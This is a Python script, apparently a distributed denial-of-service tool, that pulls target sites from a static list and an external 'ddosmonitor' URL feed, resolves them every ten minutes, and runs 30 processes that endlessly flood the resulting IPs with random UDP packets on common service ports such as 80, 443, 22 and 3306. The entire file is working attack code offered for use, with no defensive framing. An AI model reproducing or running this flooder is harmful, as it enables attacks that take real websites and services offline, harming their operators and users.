import time
import socket
import random
import multiprocessing
import urls

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

used_random_ports = [80, 443, 21, 22, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]

port_value = random.choice(used_random_ports)
#############
# with open('sites.txt') as f:
#     sites = f.readlines()

global sent

port = 1
sent = 0

# static urls to add to target url list
static_urls = []

# num of parallel worker processes
process_count = 30

# max num of dynamicly resolved urls (blue/green from https://ddosmonitor.herokuapp.com/)
dynamic_urls_count = 100

def dns_resolve(shared_ips):
    ips = []
    print("Sites: \n")
    all_urls = static_urls + urls.parse_urls()[:dynamic_urls_count]
    for site in all_urls:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        if site[-1] == "/":
            site = site[:-1]
        print('"' + site + '",')
        try:
            ips.append(socket.gethostbyname(site))
        except:
            print(f"Could not resolve:  {site} ")

    print("Resolved ips: \n")
    print(ips)

    if len(ips):
        shared_ips[:] = []
        shared_ips.extend(ips)


def loop_dns_resolve(shared_ips):
    while True:
        dns_resolve(shared_ips)
        # refresh each 10 min
        time.sleep(60 * 10)


def send_packets(shared_ips):
    while True:
        global sent, port_value
        for ip in shared_ips:
            port_value = random.choice(used_random_ports)
            sock.sendto(bytes, (ip, port_value))
            print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
            sent = sent + 1
            # port = port + 2
            # if port > 65534:
            #     port = 1
            time.sleep(0.001)


manager = multiprocessing.Manager()
shared_ips = manager.list()

urls_refresh = multiprocessing.Process(target=loop_dns_resolve, args=(shared_ips,))
urls_refresh.start()
process_list = [urls_refresh]

for i in range(process_count):
    packet_size = random.randint(10, 20)
    bytes = random._urandom(packet_size)

    p = multiprocessing.Process(target=send_packets, args=(shared_ips,))
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()